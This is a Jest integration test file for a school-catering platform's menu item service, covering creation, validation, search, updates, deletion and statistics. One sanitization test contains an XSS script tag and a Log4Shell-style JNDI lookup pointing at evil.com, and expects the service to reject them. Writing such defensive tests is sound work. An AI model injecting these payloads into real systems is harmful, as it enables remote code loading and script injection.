/**
 * HASIVU Platform - Menu System Integration Tests
 * 
 * Tests Story 2.1: Product Catalog Foundation
 * Tests the complete menu item CRUD operations and business logic
 * covering menu item lifecycle, validation, search capabilities,
 * business rule enforcement, and data integrity across the restaurant management platform.
 */

import { MenuItemService } from '../../src/services/menuItem.service';
import { MenuItemRepository, MenuCategory } from '../../src/repositories/menuItem.repository';
import { DatabaseService } from '../../src/functions/shared/database.service';
import { ValidationError, NotFoundError, ConflictError } from '../../src/utils/errors';

// Mock the database service for testing
jest.mock('../../src/functions/shared/database.service');

describe('Menu System Integration Tests', () => {
  let mockPrismaClient: any;
  let mockMenuItem: any;
  let mockMenuItems: any[];
  let createInput: any;
  let updateData: any;

  beforeAll(async () => {
    // Setup mock prisma client with all required methods
    mockPrismaClient = {
      menuItem: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
        aggregate: jest.fn(),
        upsert: jest.fn(),
      },
      $transaction: jest.fn(),
      $connect: jest.fn(),
      $disconnect: jest.fn(),
    };

    // Mock the database service client getter
    Object.defineProperty(DatabaseService, 'client', {
      get: jest.fn(() => mockPrismaClient),
      configurable: true
    });
  });

  beforeEach(() => {
    // Setup mock menu item data
    mockMenuItem = {
      id: 'menu-item-123',
      name: 'Classic Masala Dosa',
      description: 'Traditional South Indian crepe filled with spiced potatoes and served with coconut chutney and sambar',
      price: 65.00,
      originalPrice: 75.00,
      category: MenuCategory.BREAKFAST,
      available: true,
      featured: false,
      imageUrl: 'https://example.com/images/masala-dosa.jpg',
      nutritionalInfo: '{"calories": 350, "protein": "12g", "carbs": "45g", "fat": "8g"}',
      allergens: '["gluten", "dairy"]',
      tags: '["vegetarian", "traditional", "south-indian"]',
      preparationTime: 15,
      portionSize: '1 piece',
      calories: 350,
      schoolId: 'school-123',
      vendorId: 'vendor-456',
      sortOrder: 10,
      metadata: '{"spiceLevel": "medium", "region": "south-india"}',
      createdAt: new Date('2024-01-15T10:00:00Z'),
      updatedAt: new Date('2024-01-15T10:00:00Z'),
      school: {
        id: 'school-123',
        name: 'Greenwood International School',
        address: '123 Education Street, Bangalore'
      },
      vendor: {
        id: 'vendor-456',
        name: 'South Indian Delights',
        contactEmail: 'contact@sidel.com'
      }
    };

    mockMenuItems = [mockMenuItem];

    createInput = {
      name: 'Classic Masala Dosa',
      description: 'Traditional South Indian crepe filled with spiced potatoes',
      price: 65.00,
      originalPrice: 75.00,
      category: MenuCategory.BREAKFAST,
      imageUrl: 'https://example.com/images/masala-dosa.jpg',
      nutritionalInfo: '{"calories": 350, "protein": "12g"}',
      allergens: '["gluten", "dairy"]',
      tags: '["vegetarian", "traditional"]',
      preparationTime: 15,
      portionSize: '1 piece',
      calories: 350,
      schoolId: 'school-123',
      vendorId: 'vendor-456'
    };

    updateData = {
      name: 'Premium Masala Dosa',
      price: 85.00,
      featured: true,
      tags: '["vegetarian", "premium", "traditional"]'
    };

    // Reset all mocks
    jest.clearAllMocks();
  });

  afterAll(async () => {
    // Clean up any remaining connections
    jest.restoreAllMocks();
  });

  describe('Menu Item Creation', () => {
    it('should successfully create a new menu item with all required fields', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.create as jest.Mock).mockResolvedValue(mockMenuItem);
      (mockDbClient.menuItem.findFirst as jest.Mock).mockResolvedValue(null);

      // Act
      const result = await MenuItemService.create(createInput);

      // Assert
      expect(result).toEqual(mockMenuItem);
      expect(mockDbClient.menuItem.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          name: createInput.name,
          description: createInput.description,
          price: createInput.price,
          category: createInput.category
        }),
        include: expect.objectContaining({
          school: true,
          vendor: true
        })
      });
      expect(result.name).toBe('Classic Masala Dosa');
      expect(result.price).toBe(65.00);
      expect(result.category).toBe(MenuCategory.BREAKFAST);
      expect(result.available).toBe(true);
    });

    it('should throw error for duplicate menu item name in same school', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findFirst as jest.Mock).mockResolvedValue(mockMenuItem);

      // Act & Assert
      await expect(MenuItemService.create(createInput)).rejects.toThrow(
        'A menu item with this name already exists in this school'
      );
    });

    it('should validate required fields', async () => {
      // Arrange
      const invalidInput = { ...createInput, name: '' };

      // Act & Assert
      await expect(MenuItemService.create(invalidInput)).rejects.toThrow();
    });

    it('should validate price constraints', async () => {
      // Arrange
      const invalidPriceInput = { ...createInput, price: 15000 };

      // Act & Assert
      await expect(MenuItemService.create(invalidPriceInput)).rejects.toThrow(
        'Price cannot exceed ₹10,000'
      );
    });

    it('should set default values for optional fields', async () => {
      // Arrange
      const minimalInput = {
        name: 'Simple Dosa',
        description: 'Plain dosa',
        price: 45.00,
        category: MenuCategory.BREAKFAST,
        currency: 'INR',
        schoolId: 'school-123'
      };
      const mockDbClient = DatabaseService.client;
      const expectedItem = { ...mockMenuItem, ...minimalInput, available: true, featured: false };
      (mockDbClient.menuItem.create as jest.Mock).mockResolvedValue(expectedItem);
      (mockDbClient.menuItem.findFirst as jest.Mock).mockResolvedValue(null);

      // Act
      const result = await MenuItemService.create(minimalInput);

      // Assert
      expect(result.available).toBe(true);
      expect(result.featured).toBe(false);
      expect(mockDbClient.menuItem.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          available: true,
          featured: false
        }),
        include: expect.any(Object)
      });
    });

    it('should validate nutritional information format', async () => {
      // Arrange
      const invalidNutritionalInput = {
        ...createInput,
        nutritionalInfo: 'invalid-json'
      };

      // Act & Assert
      await expect(MenuItemService.create(invalidNutritionalInput)).rejects.toThrow(
        'Invalid nutritional information format'
      );
    });

    it('should validate allergens format', async () => {
      // Arrange
      const invalidAllergensInput = {
        ...createInput,
        allergens: 'not-an-array'
      };

      // Act & Assert
      await expect(MenuItemService.create(invalidAllergensInput)).rejects.toThrow(
        'Invalid allergens format'
      );
    });
  });

  describe('Menu Item Retrieval', () => {
    it('should successfully retrieve menu item by ID', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);

      // Act
      const result = await MenuItemService.findById('menu-item-123');

      // Assert
      expect(result).toEqual(mockMenuItem);
      expect(mockDbClient.menuItem.findUnique).toHaveBeenCalledWith({
        where: { id: 'menu-item-123' },
        include: expect.objectContaining({
          school: true,
          vendor: true
        })
      });
    });

    it('should return null for non-existent menu item', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(null);

      // Act
      const result = await MenuItemService.findById('non-existent');

      // Assert
      expect(result).toBeNull();
    });

    it('should get menu items by school', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue(mockMenuItems);

      // Act
      const result = await MenuItemService.findBySchool('school-123', false);

      // Assert
      expect(result).toEqual(mockMenuItems);
      expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
        where: {
          schoolId: 'school-123'
        },
        orderBy: { name: 'asc' }
      });
    });

    it('should get menu items by category', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue(mockMenuItems);

      // Act
      const result = await MenuItemService.findByCategory('school-123', MenuCategory.BREAKFAST);

      // Assert
      expect(result).toEqual(mockMenuItems);
      expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
        where: {
          schoolId: 'school-123',
          category: MenuCategory.BREAKFAST,
          available: true
        },
        orderBy: { name: 'asc' }
      });
    });
  });

  describe('Menu Item Search', () => {
    it('should search menu items by name and description', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue(mockMenuItems);

      // Act
      const result = await MenuItemService.search('school-123', 'dosa');

      // Assert
      expect(result).toEqual(mockMenuItems);
      expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
        where: {
          schoolId: 'school-123',
          available: true,
          OR: [
            { name: { contains: 'dosa' } },
            { description: { contains: 'dosa' } }
          ]
        },
        orderBy: { name: 'asc' }
      });
    });

    it('should return empty array for empty search term', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue([]);

      // Act
      const result = await MenuItemService.search('school-123', '');

      // Assert
      expect(result).toEqual([]);
    });

    it('should handle search with query', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue(mockMenuItems);

      // Act
      const result = await MenuItemService.search('school-123', 'healthy');

      // Assert
      expect(result).toEqual(mockMenuItems);
      expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
        where: {
          schoolId: 'school-123',
          available: true,
          OR: [
            { name: { contains: 'healthy' } },
            { description: { contains: 'healthy' } }
          ]
        },
        orderBy: { name: 'asc' }
      });
    });
  });

  describe('Menu Item Updates', () => {
    it('should successfully update menu item', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);
      (mockDbClient.menuItem.update as jest.Mock).mockResolvedValue({
        ...mockMenuItem,
        ...updateData
      });
      (MenuItemRepository.nameExists as any) = jest.fn().mockResolvedValue(false);

      // Act
      const result = await MenuItemService.updateMenuItem('menu-item-123', updateData);

      // Assert
      expect(result.name).toBe('Premium Masala Dosa');
      expect(result.featured).toBe(true);
      expect(mockDbClient.menuItem.update).toHaveBeenCalledWith({
        where: { id: 'menu-item-123' },
        data: expect.objectContaining({
          name: 'Premium Masala Dosa',
          price: 85.00,
          featured: true
        }),
        include: expect.objectContaining({
          school: true,
          vendor: true
        })
      });
    });

    it('should throw error when updating non-existent menu item', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(null);

      // Act & Assert
      await expect(
        MenuItemService.updateMenuItem('non-existent', { name: 'New Name' })
      ).rejects.toThrow('Menu item not found');
    });

    it('should validate name uniqueness when updating', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);
      (MenuItemRepository.nameExists as any) = jest.fn().mockResolvedValue(true);

      // Act & Assert
      await expect(
        MenuItemService.updateMenuItem('menu-item-123', { name: 'Existing Name' })
      ).rejects.toThrow('A menu item with this name already exists');
    });

    it('should validate price updates', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);

      // Act & Assert
      await expect(
        MenuItemService.updateMenuItem('menu-item-123', { price: -10 })
      ).rejects.toThrow('Price must be a positive number');
    });

    it('should update availability status', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);
      (mockDbClient.menuItem.update as jest.Mock).mockResolvedValue({
        ...mockMenuItem,
        available: false
      });

      // Act
      const result = await MenuItemService.updateMenuItem('menu-item-123', { available: false });

      // Assert
      expect(result.available).toBe(false);
      expect(mockDbClient.menuItem.update).toHaveBeenCalledWith({
        where: { id: 'menu-item-123' },
        data: expect.objectContaining({
          available: false
        }),
        include: expect.any(Object)
      });
    });
  });

  describe('Menu Item Deletion', () => {
    it('should soft delete menu item by default', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);
      (mockDbClient.menuItem.update as jest.Mock).mockResolvedValue({
        ...mockMenuItem,
        available: false
      });

      // Act
      const result = await MenuItemService.deleteMenuItem('menu-item-123', false);

      // Assert
      expect(result.available).toBe(false);
      expect(mockDbClient.menuItem.update).toHaveBeenCalledWith({
        where: { id: 'menu-item-123' },
        data: { available: false }
      });
    });

    it('should hard delete menu item when requested', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);
      (mockDbClient.menuItem.delete as jest.Mock).mockResolvedValue(mockMenuItem);

      // Act
      const result = await MenuItemService.deleteMenuItem('menu-item-123', true);

      // Assert
      expect(result).toEqual(mockMenuItem);
      expect(mockDbClient.menuItem.delete).toHaveBeenCalledWith({
        where: { id: 'menu-item-123' }
      });
    });

    it('should throw error when deleting non-existent menu item', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(null);

      // Act & Assert
      await expect(MenuItemService.deleteMenuItem('non-existent', false)).rejects.toThrow(
        'Menu item not found'
      );
    });
  });

  describe('Menu Statistics', () => {
    it('should get menu statistics by category', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.groupBy as jest.Mock).mockResolvedValue([
        { category: MenuCategory.BREAKFAST, _count: { category: 15 } },
        { category: MenuCategory.LUNCH, _count: { category: 20 } },
        { category: MenuCategory.SNACKS, _count: { category: 10 } }
      ]);
      (mockDbClient.menuItem.aggregate as jest.Mock).mockResolvedValue({
        _avg: { price: 75.25 }
      });

      // Act
      const stats = await MenuItemService.getMenuStats();

      // Assert
      expect(stats).toEqual({
        totalItems: 45,
        averagePrice: 75.25,
        byCategory: {
          [MenuCategory.BREAKFAST]: 15,
          [MenuCategory.LUNCH]: 20,
          [MenuCategory.SNACKS]: 10
        }
      });
    });

    it('should get school-specific menu statistics', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      const schoolId = 'school-123';
      (mockDbClient.menuItem.groupBy as jest.Mock).mockResolvedValue([
        { category: MenuCategory.BREAKFAST, _count: { category: 8 } }
      ]);
      (mockDbClient.menuItem.aggregate as jest.Mock).mockResolvedValue({
        _avg: { price: 65.50 }
      });

      // Act
      const stats = await MenuItemService.getMenuStats(schoolId);

      // Assert
      expect(stats.totalItems).toBe(8);
      expect(stats.averagePrice).toBe(65.50);
      expect(mockDbClient.menuItem.groupBy).toHaveBeenCalledWith({
        by: ['category'],
        _count: { category: true },
        where: { schoolId }
      });
    });

    it('should handle empty statistics gracefully', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.groupBy as jest.Mock).mockResolvedValue([]);
      (mockDbClient.menuItem.aggregate as jest.Mock).mockResolvedValue({
        _avg: { price: null }
      });

      // Act
      const stats = await MenuItemService.getMenuStats();

      // Assert
      expect(stats).toEqual({
        totalItems: 0,
        averagePrice: 0,
        byCategory: {}
      });
    });
  });

  describe('Business Logic Validation', () => {
    it('should enforce price validation rules', async () => {
      // Test negative price
      await expect(
        MenuItemService.createMenuItem({ ...createInput, price: -10 })
      ).rejects.toThrow('Price must be a positive number');

      // Test zero price
      await expect(
        MenuItemService.createMenuItem({ ...createInput, price: 0 })
      ).rejects.toThrow('Price must be a positive number');

      // Test excessive price
      await expect(
        MenuItemService.createMenuItem({ ...createInput, price: 15000 })
      ).rejects.toThrow('Price cannot exceed ₹10,000');
    });

    it('should enforce original price validation', async () => {
      // Test original price lower than current price
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          price: 100,
          originalPrice: 80
        })
      ).rejects.toThrow('Original price must be higher than current price');
    });

    it('should enforce preparation time constraints', async () => {
      // Test zero preparation time
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          preparationTime: 0
        })
      ).rejects.toThrow('Preparation time must be between 1 and 480 minutes');

      // Test excessive preparation time (over 8 hours)
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          preparationTime: 500
        })
      ).rejects.toThrow('Preparation time must be between 1 and 480 minutes');
    });

    it('should enforce calorie constraints', async () => {
      // Test negative calories
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          calories: -100
        })
      ).rejects.toThrow('Calories must be between 0 and 5000');

      // Test excessive calories
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          calories: 6000
        })
      ).rejects.toThrow('Calories must be between 0 and 5000');
    });

    it('should validate portion size format', async () => {
      // Test empty portion size
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          portionSize: ''
        })
      ).rejects.toThrow('Portion size is required');

      // Test overly long portion size
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          portionSize: 'x'.repeat(101)
        })
      ).rejects.toThrow('Portion size must be 100 characters or less');
    });

    it('should validate menu category enum', async () => {
      // Test invalid category
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          category: 'INVALID_CATEGORY' as any
        })
      ).rejects.toThrow('Invalid menu category');
    });
  });

  describe('Data Integrity and Relationships', () => {
    it('should maintain referential integrity with school', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.create as jest.Mock).mockRejectedValue(
        new Error('Foreign key constraint failed')
      );
      (MenuItemRepository.nameExists as any) = jest.fn().mockResolvedValue(false);

      // Act & Assert
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          schoolId: 'non-existent-school'
        })
      ).rejects.toThrow();
    });

    it('should maintain referential integrity with vendor', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.create as jest.Mock).mockRejectedValue(
        new Error('Foreign key constraint failed')
      );
      (MenuItemRepository.nameExists as any) = jest.fn().mockResolvedValue(false);

      // Act & Assert
      await expect(
        MenuItemService.createMenuItem({
          ...createInput,
          vendorId: 'non-existent-vendor'
        })
      ).rejects.toThrow();
    });

    it('should handle cascade operations correctly', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue({
        ...mockMenuItem,
        school: { ...mockMenuItem.schoolId },
        vendor: { ...mockMenuItem.vendorId }
      });

      // Act
      const result = await MenuItemService.getMenuItemById('menu-item-123');

      // Assert
      expect(result?.schoolId).toBeDefined();
      expect(result?.vendorId).toBeDefined();
      expect(result?.schoolId).toBe('school-123');
      expect(result?.vendorId).toBe('vendor-456');
    });
  });

  describe('Performance and Scalability', () => {
    it('should handle large result sets with pagination', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      const largeResultSet = Array.from({ length: 1000 }, (_, i) => ({
        ...mockMenuItem,
        id: `menu-item-${i}`,
        name: `Menu Item ${i}`
      }));
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue(
        largeResultSet.slice(0, 50)
      );
      (mockDbClient.menuItem.count as jest.Mock).mockResolvedValue(1000);

      // Act
      const result = await MenuItemService.getMenuItems(
        {},
        { page: 1, limit: 50 }
      );

      // Assert
      expect(result.items).toHaveLength(50);
      expect(result.total).toBe(1000);
      expect(result.totalPages).toBe(20);
      expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith(
        expect.objectContaining({
          take: 50,
          skip: 0
        })
      );
    });

    it('should optimize queries with proper indexing hints', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue(mockMenuItems);

      // Act
      await MenuItemService.getMenuItems(
        { category: MenuCategory.BREAKFAST, available: true },
        { page: 1, limit: 10 }
      );

      // Assert
      expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
        where: expect.objectContaining({
          category: MenuCategory.BREAKFAST,
          available: true
        }),
        include: expect.any(Object),
        orderBy: { name: 'asc' },
        skip: 0,
        take: 10
      });
    });

    it('should handle concurrent operations gracefully', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue(mockMenuItem);
      (mockDbClient.menuItem.update as jest.Mock).mockImplementation(() => {
        throw new Error('Concurrent modification detected');
      });

      // Act & Assert
      await expect(
        MenuItemService.updateMenuItem('menu-item-123', { price: 100 })
      ).rejects.toThrow('Concurrent modification detected');
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('should handle database connection errors gracefully', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockRejectedValue(
        new Error('Database connection failed')
      );

      // Act & Assert
      await expect(
        MenuItemService.getMenuItemById('menu-item-123')
      ).rejects.toThrow('Database connection failed');
    });

    it('should handle malformed JSON in nutritional info', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findUnique as jest.Mock).mockResolvedValue({
        ...mockMenuItem,
        nutritionalInfo: 'malformed-json'
      });

      // Act & Assert
      const result = await MenuItemService.getMenuItemById('menu-item-123');
      expect(result?.nutritionalInfo).toBe('malformed-json');
    });

    it('should validate input sanitization', async () => {
      // Arrange
      const maliciousInput = {
        ...createInput,
        name: '<script>alert("xss")</script>',
        description: '${jndi:ldap://evil.com/payload}'
      };
      (MenuItemRepository.nameExists as any) = jest.fn().mockResolvedValue(false);

      // Act & Assert
      await expect(
        MenuItemService.createMenuItem(maliciousInput)
      ).rejects.toThrow('Invalid characters in input');
    });

    it('should handle empty search results', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.findMany as jest.Mock).mockResolvedValue([]);
      (mockDbClient.menuItem.count as jest.Mock).mockResolvedValue(0);

      // Act
      const result = await MenuItemService.searchMenuItems('nonexistent', {}, {});

      // Assert
      expect(result).toEqual({
        items: [],
        total: 0,
        page: 1,
        limit: 10,
        totalPages: 0
      });
    });
  });

  describe('Integration with External Systems', () => {
    it('should handle vendor service integration', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.create as jest.Mock).mockResolvedValue(mockMenuItem);
      (MenuItemRepository.nameExists as any) = jest.fn().mockResolvedValue(false);

      // Act
      const result = await MenuItemService.createMenuItem(createInput);

      // Assert
      expect(result.vendorId).toBeDefined();
      expect(result.vendorId).toBe('vendor-456');
    });

    it('should handle school service integration', async () => {
      // Arrange
      const mockDbClient = DatabaseService.client;
      (mockDbClient.menuItem.create as jest.Mock).mockResolvedValue(mockMenuItem);
      (MenuItemRepository.nameExists as any) = jest.fn().mockResolvedValue(false);

      // Act
      const result = await MenuItemService.createMenuItem(createInput);

      // Assert
      expect(result.schoolId).toBeDefined();
      expect(result.schoolId).toBe('school-123');
    });
  });
});